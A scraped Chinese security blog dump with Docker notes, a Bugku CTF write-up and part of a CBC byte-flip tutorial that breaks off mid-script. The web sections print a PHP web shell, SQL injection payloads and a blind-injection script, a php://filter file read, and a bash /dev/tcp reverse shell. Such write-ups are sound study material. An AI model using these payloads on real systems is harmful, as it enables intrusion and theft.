--no-prune&#x3D;false &#x2F;&#x2F;保留镜像中未打标签的父镜像 获取和查找镜像 查找镜像 Docker Hub 在官方网站上进行搜索 docker search [OPTIOINS] TREM —automated=false Only show automated builds —no-trunc=false Don’t truncate output -s,—stars=0 Only displays with at least stars EXAMPLE: 1docker search ubuntu 获取和推送镜像 拉取镜像 12docker pull [OPTIONS] NAME [:TAG] -a,--all-tags&#x3D;false Download all tagged images in the respository EXP: 1docker pull ubuntu:14.04 这个命令拉取镜像的速度不是非常可观，这是因为站点在国外的原因，可以通过设置国内镜像源来提高下载速度 在 daocloud 上注册账户，点击加速器，复制命令在自己的主机上执行即可发现再拉取镜像是速度明显提高 推送镜像 1docker push NAME[:TAG] 构建镜像 构建镜像可以帮我们保存对容器的修改，方便再次使用；同时也可以自定义镜像，还可以以软件的形式打包并分发服务及运行环境 使用commit来构建镜像 创建一个镜像 1docker run -it -p 80 --name commit_test ubuntu &#x2F;bin&#x2F;bash 提交镜像 1docker commit -a &#39;charles&#39; -m &#39;nginx&#39; 仓库名 使用dockerfile创建镜像 自行百度，略 Docker守护进程的配置与操作 查看守护进程 12ps -ef|grep dockersudo status docker Docker守护进程的停止开始 1sudo service docker stop|start|restart Docker配置被修改后需要重启才能够生效 Docker的启动配置文件(配置docker的启动信息) 文件位置 /etc/default/docker 利用该文件可以修改docker的各种启动配置信息 Docker的远程访问 环境准备 第二台安装docker的服务器修改docker守护进程的启动选项以区别服务器保证client API与server API版本一致 Dcoker的容器卷管理 直接指定文件 1docker run -it -v ~&#x2F;datavolume:[ro]&#x2F;data[:ro] ubuntu &#x2F;bin&#x2F;bash /datavolumn指定源文件位置如果文件不存在则会自动创建，/data指定docker文件中的文件位置，[ro]指定文件访问权限 创建dockerfile Docker容器互联 分别演示三部分 允许所有容器互联(默认)；拒绝容器间互联；允许特定容器间的连接","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://chaosec.top/tags/docker/"}]},{"title":"bugku-writeup续","slug":"bugku-writeup续","date":"2018-04-03T14:33:55.000Z","updated":"2019-01-30T11:44:01.070Z","comments":true,"path":"2018/04/03/bugku-writeup续/","link":"","permalink":"http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/","excerpt":"杂项 账号被盗了","text":"杂项 账号被盗了 先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到 AUTH LOGIN334 VXNlcm5hbWU6YmtjdGZ0ZXN0QDE2My5jb20=334 UGFzc3dvcmQ6YTEyMzQ1Ng== 这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag 1flag&#123;182100518+725593795416&#125; 爆照(08067CTF) binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag 妹子的陌陌 上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 喜欢我吗. 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相） 听首音乐 音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。 好多数值 这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。 1234567891011121314151617from PIL import Image# 可能的图片大小# (1006 , 61)# (503 , 122)# (122 , 503)with open('1.txt','r') as file: x = 503 y = 122 im = Image.new('RGB',(x,y)) for i in range(x): for j in range(y): line = file.readline() rgb = line.split(',') im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))im.show() convert 题目给出了一堆二进制数，照常先转为16进制，发现前六位是 526172，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag 1234567891011s = '''0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000'''# 这里输入二进制全文，这里只有删除了大部分的内容b = hex(int(s,2))a = '52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'# 16进制全文，注意删除前面的0x字段with open('1.rar','wb') as file: file.write(a.decode('hex')) 好多压缩包 下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞 123456789101112131415161718192021222324252627#coding:utf-8import zipfileimport stringimport binasciidef CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): f.write(s) returndef CrackZip(): for I in range(68): file = '123/out' + str(I) + '.zip' f = zipfile.ZipFile(file, 'r') GetCrc = f.getinfo('data.txt') crc = GetCrc.CRC CrackCrc(crc)dic = string.ascii_letters + string.digits + '+/='f = open('out.txt', 'w')CrackZip()f.close() 打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 fix the file and get the flag ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释） 一个普通的压缩包(xp0intCTF) 文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 A8 3C 74 ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。 就五层你能解开吗 根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下 1python crc32.py reverse 0x4dad5967 得到 4 bytes: {0x1b, 0xd6, 0x38, 0xc2}verification checksum: 0x4dad5967 (OK)alternative: 9rNYn3 (OK)alternative: Ay8sZC (OK)alternative: QHSaFX (OK)alternative: TmQA5n (OK)alternative: VQT_ls (OK)alternative: X28BT9 (OK)alternative: _GLQzV (OK)alternative: goMEPt (OK)alternative: nyUKFQ (OK)alternative: t_s4f3 (OK)alternative: xQxVkx (OK)alternative: yQ9gpa (OK) 把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 _CRC32_i5_n0t_s4f3 ，第一层解开！ 第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 rla 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况 明文 密文 密钥 the rla yew she rla zee you rla txq key rla hhc 查表发现只有第一个可以找到对应密钥，尝试解密一下 the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny 语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！ 第三次sha1碰撞，继续上脚本 123456789101112131415161718import stringimport hashlibkeys = string.ascii_letters + string.digits + string.punctuationdef sha1(s): sha1_hash = hashlib.sha1() sha1_hash.update(s) return sha1_hash.hexdigest()for i in keys: for j in keys: for p in keys: for q in keys: password = i + '7' + j + '5-' + p + '4' + q + '3?' sha = sha1(password.encode('utf-8')) if sha[0:7] == '619c20c' and sha[8] == 'a' and sha[16] == '9': print(password) 得到密码 I7~5-s4F3? ，第三次解开！ 第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 Hello World ;-) ,另一个输出 Goodbye World :-( ，以此为密码即可解开 第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下 1openssl rsa -pubin -in rsa_public_key.pem -text -modulus 可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d 8264667972294275017293339772371783322168822149471976834221082393409363691895 那么接下来就是生成私钥了，github上有个ctftool可以生成私钥 1python rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546 PS：篇幅所限，数字我都缩小了 然后利用生成的私钥解密 1openssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt 然后即可得到flag。 web 文件上传2 这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 upload.php，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下: 1&lt;script language&#x3D;&quot;php&quot;&gt; system($_REQUEST[a])&lt;&#x2F;script&gt; 发现成功上传，传递参数1?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;ls 有个txt文件，查看一下1?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt 如此可得到flag flag.php 点了确实没反应，看了提示是 hint，原来是要get一个hint参数为1， ?hint=1，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与$EKY的反序列化全等即可。但要注意的是$KEY在序列化之前，即$KEY=’’，序列化为 s:0:”” 报错注入 题目主要过滤了空格，可以用 /**/绕过，这里介绍个 load_file(filename)可以查看文件，然后慢慢截取即可 1id&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1) 但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！ sql注入2 发现文件泄露，访问flag即可(贼几把坑) 文件上传2(湖湘杯) 这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。 1http:&#x2F;&#x2F;120.24.86.145:9011&#x2F;?op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag 孙xx的博客 扫描旁站发现一个PHPmyadmin，查看博客内容 MySQL数据库用户名define(‘DB_USER’, ‘wp’); MySQL数据库密码define(‘DB_PASSWORD’, ‘wzTrzYRdbrbyjAx’); 登录即可找到flag login(SKCTF) 题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个mid()函数，可以绕过for和逗号 1username&#x3D;admin&#39;^(ascii(mid((password)from(1)))&lt;&gt;55)^0#&amp;password&#x3D;123 直接上脚本即可 123456789101112131415161718192021import requestsurl = \"http://118.89.219.210:49167/\"payload = ''data = &#123;'username':payload,'password':'123'&#125;flag_yes = 'error'flag = ''start = 1end_signal = Truewhile(end_signal): end_signal = False for j in range(33,127): payload = \"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#\".format(str(start),str(j)) data['username'] = payload res = requests.post(url,data=data).text if flag_yes in res: flag += chr(j) print(flag) start += 1 end_signal = True break 注意：解出后的密码要md5解密，怪我太年轻。 PHP_encrypt_1(ISCCCTF) 这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码1234567891011121314151617181920212223242526272829303132333435363738394041# python3import base64import hashlibcipher = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=' # 题目中应该给出的密文串plain = base64.b64decode(cipher)plain = plain.decode('unicode-escape')plain1 = ''# 构造题目中的md5串m = hashlib.md5()m.update(b'ISCC')key = m.hexdigest()char = ''x = 0for i in range(len(cipher)): if x == len(key): x = 0 char += key[x] x += 1numflag = [] # 明文ascii码值def Is_OK(number): if number &gt;= 33 and number &lt; 127: return True else: return Falsefor i in range(len(plain)): for j in range(2): tmp = 128 * j + ord(plain[i]) - ord(char[i]) if Is_OK(tmp): numflag.append(tmp) break continuefor i in numflag: print(chr(i),end=\"\") login2(SKCTF) 这题纯学习姿势，先正常发送请求，抓包发现提示是 tips，base64解码，是一段php代码12$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123;&#125; 题目也提示了union绕过，payload 1username&#x3D;1&#39; union select md5(1),md5(1)#&amp;password&#x3D;1 如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！ 反弹shell 你的linux主机上监听一下端口 1nc -lvv 8888 然后执行命令 1|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;你的ip地址&#x2F;8888 0&gt;&amp;1 如此即可成功反弹到shell!!!!(233333) 然后读文件即可 代码审计 md5加密相等绕过 payload1?a&#x3D;240610708 ereg正则%00截断 好坑啊，提交了一个 ?password=9e9%00-老是不对，没想到居然是 ?password=9e9%00*-*,哎，扎心了… extract变量覆盖 比较简单，payload12?shiyan&#x3D;flag&amp;flag&#x3D;php:&#x2F;&#x2F;inputflag 第二行以post方式提交 urldecode二次编码饶过 题目关键点在于，$_GET[]会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。1?id&#x3D;%2568%2561%2563%256B%2565%2572%2544%254A二次编码后提交即可。 md5函数 直接提交数组即可 sha函数比较绕过 还是提交数组即可 十六进制与数字比较 直接提交16进制数字即可。 strpos数组绕过 还是数字绕过 ?ctf[]=1234 杂项 眼见非实(ISCCCTF) 看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 504b0304的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。 又一张图片，还单纯吗 binwalk跑一下发现有两个图片，切一下即可1falg&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125; 宽带信息泄露 百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。 隐写2 binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。 linux 直接解压，然后有个flag文件，hex里面找一下key即可。 中国菜刀 下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之12345678910@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION&lt;'5.3.0')&#123; @set_magic_quotes_runtime0);&#125;;echo(\"X@Y\");$F='C:\\\\wwwroot\\\\3.php';$P=@fopen($F,'r');echo(@fread($P,filesize($F)));@fclose($P);;echo(\"X@Y\");die(); 这应该是打开某个文件，开头和末尾都是 X@Y,查看下一个http流 这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag 这么多数据包 这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、 隐写3 改变图片高度即可 想蹭网先解开密码 这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下 1aircrack-ng wifi.cap -w passwd.txt linux2 下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可 1strings brave &gt; a.txt 然后在a.txt中搜索一下 key，直接出现了flag 账号被盗了 这题不会… 聪明的大象 解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag web进阶 实战2-注入 打开后发现news页面有id参数，加引号可以报错注入1?id&#x3D;18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 21,1),0x7e),1) Trim的日记本 扫描目录，发现有一个 show.php进入即可得到flag！！！！不过不知道是不是正解。 社工 社工进阶 百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 a123456 信息查找 直接百度 bugku.cn 今日头条，第一个结果的群号即可。 简单个人信息收集 首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。 简单的社工尝试 google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。 加密 简单加密 凯撒移位，代码 123456789cipher = 'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'for i in range(-70,32): for j in cipher: # print(ord(j)+i) if (ord(j)+i) &gt; 132 or (ord(j)+i) &lt; 33: break print(chr(ord(j)+i),end=\"\") print('\\n') 一段base64 多层解码，贴上代码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import base64import reimport stringfrom urllib import parsewith open('base64.txt') as file: # base64解码 text = file.read() text = base64.b64decode(text) text = text.decode('utf-8') alp = re.findall(r'([0-7]+)',text) # base64解码后发现像8进制，8进制转换成10进制 new_alp = [] for item in alp: new_alp.append(int(item,8)) # ascii解码 alp = '' for i in new_alp: alp += str(chr(i)) # 前面的解码后为'\\xdd'的形式，推测为16进制 plain = '' cipher = re.findall(r'\\\\x([0-9a-f]+)',alp) for i in cipher: plain += str(chr(int(i,16))) # unicode解码 cipher2 = bytes(plain,encoding='utf-8') plain2 = cipher2.decode('unicode-escape') # ascii解码 cipher3 = re.findall(r'[0-9]&#123;2,&#125;',plain2) plain3 = '' for i in cipher3: plain3 += chr(int(i)) # unicode解码 cipher4 = re.findall(r'#x([0-9a-f]+)',plain3) plain4 = [] for i in cipher4: plain4.append(int(i,16)) # ascii解码 cipher5 = plain4 plain5 = '' for i in cipher5: plain5 += chr(i) # unicode cipher6 = re.findall(r'&amp;#([0-9]&#123;2,&#125;)',plain5) plain6 = '' for i in cipher6: plain6 += chr(int(i)) # urldecode print(parse.unquote(plain6)) ‘!? 看了别人的wp，这题还是Ook!语言跑一下 +[]-brainfuck语言跑一下 奇怪的密码 其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了 12345678910cipher = 'gndk€rlqhmtkwwp&#125;z'plain = ''seq = 1for i in cipher: if i == '€': # 该字符为非法字符，不去掉的话可能会报错 seq += 1 continue plain += chr((ord(i) - seq)) seq += 1print(plain) 托马斯杰斐逊 根据提示可知是杰斐逊圆盘加密，附上解密脚本 123456789101112131415161718192021222324252627282930313233tomas = '''ZWAXJGDLUBVIQHKYPNTCRMOSFEKPBELNACZDTRXMJQOYHGVSFUWIBDMAIZVRNSJUWFHTEQGYXPLOCKRPLNDVHGFCUKTEBSXQYIZMJWAOIHFRLABEUOTSGJVDKCPMNZQWXYAMKGHIWPNYCJBFZDRUSLOQXVETGWTHSPYBXIZULVKMRAFDCEONJQNOZUTWDCVRJLXKISEFAPMYGHBQQWATDSRFHENYVUBMCOIKZGJXPLWABMCXPLTDSRJQZGOIKFHENYVUXPLTDAOIKFZGHENYSRUBMCQWVJTDSWAYXPLVUBOIKZGJRFHENMCQBMCSRFHLTDENQWAOXPYVUIKZGJXPHKZGJTDSENYVUBMLAOIRFCQW'''new_tomas = []tmp = ''for i in range(len(tomas)): if tomas[i] == '\\n': new_tomas.append(tmp) tmp = '' else: tmp += tomas[i]key = [2,5,1,3,6,4,9,7,8,14,10,13,11,12]cipher = 'HCBTSXWCRQGLES'for index in range(len(cipher)): for p in range(26): if new_tomas[key[index]-1][p] == cipher[index]: new_tomas[key[index]-1] = new_tomas[key[index]-1][p:] + new_tomas[key[index]-1][:p] breakfor item in key: print(new_tomas[item-1][-6:]+new_tomas[item-1][:-6]) # 让输出更明显一点 输出如下 XMJQOYHGVSFUWIKPBELNACZDTRSGJVDKCPMNZQWXYIHFRLABEUOTXJGDLUBVIQHKYPNTCRMOSFEZWASJUWFHTEQGYXPLOCKBDMAIZVRNBFZDRUSLOQXVETAMKGHIWPNYCJUKTEBSXQYIZMJWAORPLNDVHGFCGJXPLQWATDSRFHENYVUBMCOIKZKMRAFDCEONJQGWTHSPYBXIZULVUTWDCVRJLXKISEFAPMYGHBQNOZAOIRFCQWXPHKZGJTDSENYVUBMLDSRJQZGOIKFHENYVUWABMCXPLTMCSRFHLTDENQWAOXPYVUIKZGJBIKFZGHENYSRUBMCQWVJXPLTDAONMCQTDSWAYXPLVUBOIKZGJRFHE 好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。 zip伪加密 已经说了是zip伪加密，直接16进制修改一下即可 告诉你个秘密(ISCCCTF) 看字符串像16进制，转成字符串可以看到像base64，再解码一次 1r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 这是键盘对应的码 1TONGYUAN 注意本题没有说明flag的提交方式，应该是 flag:TONGYUAN 来自宇宙的信号 既然说了是银河战队，直接百度搜 银河 文字，会看到第一个结果赫然是标准银河字母，对照一下就可以了。 至此，所有加密题目OK。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"CBC字节翻转攻击","slug":"CBC-Attack","date":"2018-03-23T11:44:31.000Z","updated":"2019-02-16T08:25:30.686Z","comments":true,"path":"2018/03/23/CBC-Attack/","link":"","permalink":"http://chaosec.top/2018/03/23/CBC-Attack/","excerpt":"前言 最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目传送门。","text":"前言 最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目传送门。 原理 CBC攻击方法的精髓在于通过损坏密文字节来改变明文字节，从而达到绕过过滤器或者提权等目的。贴一张图片 plaintext:待加密的数据 Ⅳ：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文 Ciphertext：加密后的数据 注意：CBC工作于一个固定长度的比特组，称之为块(BLOCK)，本文中将使用16字节的块。 加密过程： 1.首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。2.生成一个随机的初始化向量(IV)和一个密钥。3.将IV和第一组明文异或。4.用密钥对3中xor后产生的密文加密。5.用4中产生的密文对第二组明文进行xor操作。6.用密钥对5中产生的密文加密。7.重复4-7，到最后一组明文。8.将IV和加密后的密文拼接在一起，得到最终的密文。 从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：前一块的密文用来产生后一块的密文。 解密过程： 解密过程就是加密过程的逆过程 1.从密文中提取出IV，然后将密文分组。2.使用密钥对第一组的密文解密，然后和IV进行xor得到明文。3.使用密钥对第二组密文解密，然后和2中的密文xor得到明文。4.重复2-3，直到最后一组密文。 攻击原理图 这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。 介绍一下异或的概念 当我们的一个值C是由A和B异或得到C = A XOR B那么A XOR B XOR C很明显是=0的当我们知道B和C之后，想要得到A的值也很容易A = B XOR C因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。 上手题目 存在目录泄露 .index.php.swp，会下载到一个源码，需要用vim恢复一下，使用下面的命令 1vi -r &#123;your file name&#125; 然后用下面的命令删除swp文件，不然每一次编辑时总是有这个提示。 1rm .&#123;your file name&#125;.swp 再输入7即可恢复代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;Login Form&lt;/title&gt;&lt;link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;&lt;script type=\"text/javascript\" src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;$(document).ready(function() &#123; $(\".username\").focus(function() &#123; $(\".user-icon\").css(\"left\",\"-48px\"); &#125;); $(\".username\").blur(function() &#123; $(\".user-icon\").css(\"left\",\"0px\"); &#125;); $(\".password\").focus(function() &#123; $(\".pass-icon\").css(\"left\",\"-48px\"); &#125;); $(\".password\").blur(function() &#123; $(\".pass-icon\").css(\"left\",\"0px\"); &#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;?phpdefine(\"SECRET_KEY\", file_get_contents('/root/key'));define(\"METHOD\", \"aes-128-cbc\");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(\"iv\", base64_encode($iv)); setcookie(\"cipher\", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[\"iv\"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(\"&lt;p&gt;base64_decode('\".base64_encode($plain).\"') can't unserialize&lt;/p&gt;\"); $_SESSION['username'] = $info['username']; &#125;else&#123; die(\"ERROR!\"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION[\"username\"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[\"username\"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class=\"login-body\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div class=\"user-icon\"&gt;&lt;/div&gt; &lt;div class=\"pass-icon\"&gt;&lt;/div&gt; &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt; &lt;div class=\"header\"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;/div&gt; &lt;div class=\"footer\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;t&lt;/html&gt; 一直也不行，心态崩了(2333333…) 一个星期之后….. 我胡汉三又回来了！！！！ 我们把返回的cipher值进行翻转，想要翻转第二块的 m为 a只需要把第一行对应第九位翻转一下即可，代码如下 123456789101112131415161718192021222324import urllib.parseimport requestsimport base64iv = 'sDGucEcgR9ixzDNVm6IrpA%3D%3D'cipher_raw = 'xhp6%2B1A%2FKctfyU%2BbQeuRx3lUMrDUN%2FOuXg96c%2FJ%2Byn5DX2UVNMavsdocAGjmu6SmuRD6kY8Ef4rLKYADlEeUjQ%3D%3D'print(\"[*]原始iv和cipher\")print('翻转前：')print('cipher_raw:',cipher_raw)print('iv_raw:',iv)print('翻转后：')tmp1 = urllib.parse.unquote(cipher_raw)cipher = base64.b64decode(tmp1)# a:2:&#123;s:8:\"userna# me\";s:5:\"mdmin\";# s:8:\"password\";s# :6:\"123456\";&#125;cipher = cipher.decode('unicode_escape')xor_cipher = cipher[0:9] + chr(ord(cipher[9]) ^ ord('m') ^ ord('a')) + cipher[10:]xor_cipher = urllib.parse.quote(base64.b64encode(xor_cipher.encode('latin-1')))print(xor_cipher) 写完这个脚本，我心中又不禁对python的编码问题骂了无数次mmp，真的太多坑了….. 然后修改cookie中的cipher值，刷新页面（注意此时不能提交数据,要把post数据清空）之后，页面会提示反序列化失败，这是因为我们修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。 贴一下代码 123456789101112# 得到新的iv值iv = 